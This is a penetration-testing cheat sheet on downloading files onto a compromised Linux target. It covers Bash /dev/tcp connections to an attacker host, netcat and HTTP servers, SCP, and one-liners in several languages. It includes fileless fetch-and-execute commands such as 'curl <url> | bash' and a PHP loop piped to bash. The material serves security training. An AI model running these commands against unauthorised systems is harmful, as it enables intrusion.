---
id: Download
aliases: []
tags:
  - Pentest/File-Transfer/Linux/Download
---

# Download

Download files to the target machine
(*e.g., from the Internet/Attacker machine*)

```mermaid
flowchart LR
    Attacker-->Target
```
___

<!-- Bash {{{-->
## Bash

Download files with Bash using the built-in
[/dev/TCP](https://tldp.org/LDP/abs/html/devref1.html)
device file

<!-- Info {{{-->
> [!info]
>
> Requires Bash `2.04<`, compiled with `--enable-net-redirections`
<!-- }}} -->

**METHOD 1**

1. **Attacker**: Serve a file with [[Netcat#File Transfer|Netcat]]

```sh
sudo nc -l -p 443 -q < <file>
```

```sh
sudo ncat -l -p 443 --send-only < <file>
```

2. **Target**: Open a connection to the attacker machine

```sh
cat < /dev/tcp/<attacker_ip>/<port> > <out_file>
```

**METHOD 2**

1. **Target**: Connect to a web server

```sh
exec 3<>/dev/tcp/<target>/<port>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> exec 3<>/dev/tcp/10.10.10.32/80
> ```
<!-- }}} -->

2. **Target**: Initiate a [[HTTP/General#HTTP Methods|HTTP GET Request]]
   to get the file

```sh
echo -e "GET /<file> HTTP/1.1\n\n">&3
```

<!-- Example {{{ -->
> [!example]-
>
> ```sh
> echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
> ```
<!-- }}} -->

3. **Target**: Print the response

```sh
cat <&3
```

___
<!-- }}} -->

<!-- Base64 {{{-->
## Base64

Encode the file to [[Base64]],
in case it is not possible to transfer files
(*e.g., if the remote host has firewall protection*)

1. **Attacker**: Run [md5sum](https://en.wikipedia.org/wiki/Md5sum)
   on the file for reference

```sh
md5sum <file>
```

<!-- Example {{{-->
> [!example]-
>
> ```
> md5sum id_rsa
> ```
> ```sh
> 321de1d7e7c3735838890a72c9ae7d1d id_rsa
> ```
<!-- }}} -->

2. **Attacker**: [[Base64#Encode|Base64 Encode]] the binary file

3. **Target**: [[Base64#Decode|Base64 Decode]] string

4. **Target**:
   Validate the hash with [md5sum](https://en.wikipedia.org/wiki/Md5sum)

```sh
md5sum <file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> md5sum id_rsa
> ```
> ```sh
> 321de1d7e7c3735838890a72c9ae7d1d id_rsa
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Web Download {{{-->
## Web Download

Download file(*s*) to the remote host from

- a [Python HTTP Server](https://developer.mozilla.org/en-US/docs/Learn_web_development/Howto/Tools_and_setup/set_up_a_local_testing_server)
  running on the attacker machine
- the Internet

**Attacker**: Set up a [Python HTTP Server](https://developer.mozilla.org/en-US/docs/Learn_web_development/Howto/Tools_and_setup/set_up_a_local_testing_server)
to serve files

```sh
sudo python3 -m http.server 8000
```

[[cURL]] — Download a file

```sh
curl <url> -o <out_file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
> ```
<!-- }}} -->

[[wget]] — Download a file

```sh
wget <url> -O <out_file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
> ```
<!-- }}} -->

<!-- Fileless Download {{{-->
### Fileless Download

Because of the way Linux works
and how [pipes operate](https://www.geeksforgeeks.org/linux-unix/piping-in-unix-or-linux/),
most of the tools in Linux can be used
to replicate fileless operations

<!-- Warning {{{-->
> [!warning]
>
> Depending on the payload chosen it may create temporary files on the OS
> (*e.g., [mkfifo](https://en.wikipedia.org/wiki/Named_pipe)*)
<!-- }}} -->

[[cURL]] — Download and execute a file

```sh
curl <url> | bash
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
> ```
<!-- }}} -->

[[wget]] — Download and execute a file

```sh
wget -qO- <url> | python3
```

<!-- Info {{{-->
> [!info]
>
> - `-o`: Output file
> - `-q`: Quiet, turn off output
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
> ```
> ```sh
> Hello World!
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- SSH {{{-->
## SSH

The [[SSH/General|SSH]] implementation comes with an
[[SCP]] utility for remote file transfer

It is possible to transfer files using `scp` once

- SSH connection is established
- User credentials are known

<!-- SSH Server {{{-->
### SSH Server

Set up an SSH server on the attacker machine
prior to transferring files

1. Enable the SSH Server

```sh
sudo systemctl enable ssh
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sudo systemctl enable ssh
> ```
> ```sh
> Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
> Executing: /lib/systemd/systemd-sysv-install enable ssh
> Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
> ...SNIP...
> ```
<!-- }}} -->

2. Start the SSH Server

```sh
sudo systemctl start ssh
```

3. Check for SSH Listening Port

```sh
netstat -lnpt
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> netstat -lnpt
> ```
> ```sh
> (Not all processes could be identified, non-owned process info
>  will not be shown, you would have to be root to see it all.)
> Active Internet connections (only servers)
> Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
> tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
> ```
<!-- }}} -->

<!-- }}} -->

<!-- SCP Transfer {{{-->
### SCP Transfer

Download a file to the target machine

```sh
scp <user>@<target_ip>:<file> .
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> scp user@192.168.49.128:/root/myroot.txt .
> ```
<!-- }}} -->

<!-- Tip {{{-->
> [!tip]
>
> Create a temporary user account for file transfers
> to avoid using primary credentials or keys on the target computer
>
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Code {{{-->
## Code

Download files to the target machine
using the installed programming languages

<!-- Python {{{-->
### Python

[Python 3](https://www.python.org/downloads/)
— Download a file

```sh
python3 -c 'import urllib.request;urllib.request.urlretrieve("<url>", "<out_file>")'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
> ```
<!-- }}} -->

[Python 2.7](https://www.python.org/download/releases/2.7/)
— Download a file

```sh
python2.7 -c 'import urllib;urllib.urlretrieve ("<url>", "<out_file>")'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
> ```
<!-- }}} -->

<!-- }}} -->

<!-- PHP {{{-->
### PHP

[File_get_contents()](https://www.php.net/manual/en/function.file-get-contents.php)
— Download a file

```sh
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
> ```
<!-- }}} -->

[Fopen()](https://www.php.net/manual/en/function.fopen.php)
— Download a file

```sh
php -r 'const BUFFER = 1024; $fremote = 
fopen("<file>", "rb"); $flocal = fopen("<out_file>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> php -r 'const BUFFER = 1024; $fremote = 
> fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
> ```
<!-- }}} -->

Fileless download

> [!tip]
>
> The URL can be used as a filename with the `@file` function
> if the `fopen` wrappers have been enabled

```sh
php -r '$lines = @file("<url>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Ruby {{{-->
### Ruby

```sh
ruby -e 'require "net/http"; File.write("<out_file>", Net::HTTP.get(URI.parse("<url>")))'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Perl {{{-->
### Perl

```sh
perl -e 'use LWP::Simple; getstore("<url>", "<out_file>");'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->
